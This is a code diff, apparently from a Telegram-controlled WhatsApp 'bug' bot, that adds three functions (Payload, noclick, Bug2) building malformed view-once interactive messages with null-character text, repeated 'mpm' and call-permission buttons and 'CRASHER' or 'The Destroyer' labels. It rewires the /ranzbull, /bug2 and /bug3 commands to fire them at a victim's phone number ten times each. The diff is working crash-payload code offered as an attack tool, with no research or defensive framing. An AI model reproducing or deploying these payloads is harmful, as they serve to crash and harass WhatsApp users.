@@ -846,6 +846,148 @@ async function zerosUi(target, Ptcp = true) {
     console.log(err);
   }
 }
+async function Payload(target) {
+  try {
+    let message = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: {
+            contextInfo: {
+              mentionedJid: [target],
+              isForwarded: true,
+              forwardingScore: 999,
+              businessMessageForwardInfo: {
+                businessOwnerJid: target,
+              },
+            },
+            body: { text: "\u0000" },
+            nativeFlowMessage: {
+              buttons: [
+                { name: "single_select", buttonParamsJson: "" },
+                { name: "call_permission_request", buttonParamsJson: "" },
+                { name: "mpm", buttonParamsJson: "" },
+                { name: "mpm", buttonParamsJson: "" },
+                { name: "mpm", buttonParamsJson: "" },
+                { name: "mpm", buttonParamsJson: "" },
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await sock.relayMessage(target, message, { participant: { jid: target } });
+  } catch (err) {
+    console.log(err);
+  }
+}
+
+async function noclick(target) {
+  let msg = await generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "💥⃟༑⌁⃰𝗡͖͜𝗘𞋯͡𝗕͋͢͜𝗨̸͔͋͡𝗟̸͋͢͜𝗔",
+              hasMediaAttachment: false,
+            },
+            body: {
+              text: "𝗖͡𝗥͖⃰͜𝗔̐͢͡𝗦̸͔̐͜𝗛̐͢͡𝗘͔̐͜𝗥̐͢͡",
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "",
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "z",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: "{}",
+                },
+              ],
+            },
+          },
+        },
+      },
+    },
+    {}
+  );
+
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+  });
+}
+
+async function Bug2(target) {
+  try {
+    let message = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 2,
+          },
+          interactiveMessage: {
+            contextInfo: {
+              mentionedJid: [target],
+              isForwarded: true,
+              forwardingScore: 999,
+              businessMessageForwardInfo: {
+                businessOwnerJid: target,
+              },
+            },
+            body: {
+              text: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "single_select",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "call_permission_request",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "mpm",
+                  buttonParamsJson: "",
+                },
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await sock.relayMessage(target, message, {
+      participant: { jid: target },
+    });
+  } catch (err) {
+    console.log(err);
+  }
+}
+
 async function VampireGroupInvis(target, ptcp = true) {
     try {
         const message = {
@@ -3176,9 +3318,8 @@ bot.onText(/\/ranzbull(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 300; i++) { // Kirim 3 kali langsung
-        await bulldozerV2(formatedNumber)
-        await new Promise((resolve) => setTimeout(resolve, 2500));
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await Payload(formatedNumber)
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -3225,8 +3366,8 @@ bot.onText(/\/bug2(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
-        await protocolbug2(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await noclick(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
@@ -3272,8 +3413,8 @@ bot.onText(/\/bug3(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
-        await CrashFcKipop(formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await Bug2(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
